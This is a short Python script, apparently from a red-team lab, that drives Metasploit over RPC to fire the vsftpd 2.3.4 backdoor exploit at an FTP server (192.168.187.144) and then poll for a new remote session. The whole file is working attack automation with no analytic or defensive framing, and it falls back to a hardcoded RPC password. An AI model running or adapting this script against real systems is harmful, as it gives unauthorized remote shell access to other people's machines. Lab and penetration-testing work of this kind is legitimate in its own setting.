from pymetasploit3.msfrpc import MsfRpcClient
import time, os

pw = os.environ.get("MSF_RPC_PASS", "redteam123")
c = MsfRpcClient(pw, server='127.0.0.1', port=55552, ssl=False)
print("Connected OK")

mod = c.modules.use("exploit", "unix/ftp/vsftpd_234_backdoor")
mod["RHOSTS"] = "192.168.187.144"
mod["RPORT"] = 21

before = set(c.sessions.list.keys())
r = mod.execute()
print("Execute result:", r)

for i in range(15):
    time.sleep(3)
    sess = set(c.sessions.list.keys()) - before
    if sess:
        print("SESSION OPENED:", sess)
        print(c.sessions.list)
        break
    print(f"  waiting... {i*3}s")
else:
    print("NO SESSION after 45s")

